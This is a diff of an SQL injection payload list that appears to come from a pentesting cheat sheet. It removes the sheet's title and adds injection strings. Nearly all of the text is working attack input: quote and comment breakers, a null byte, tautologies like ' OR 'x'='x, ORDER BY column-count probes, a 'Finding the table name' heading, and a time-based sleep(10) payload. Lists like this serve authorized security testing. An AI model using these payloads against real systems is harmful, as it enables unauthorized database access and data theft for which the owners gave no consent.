@@ -1,8 +1,3 @@
----SQL Injection Cheat Cheat---
-
-*Try to URL encode :)
-
-
 '
 ''
 `
@@ -14,11 +9,20 @@
 //
 \
 \\
-;%00	Nullbyte
+;
+
+' OR 'x'='x
+' AND id IS NULL; --
+
+
+%00
 
 1' ORDER BY 1--+
 1' ORDER BY 2--+
 1' ORDER BY 3--+
+
+Finding the table name
+
 
 Time-Based:
 ,(select * from (select(sleep(10)))a)
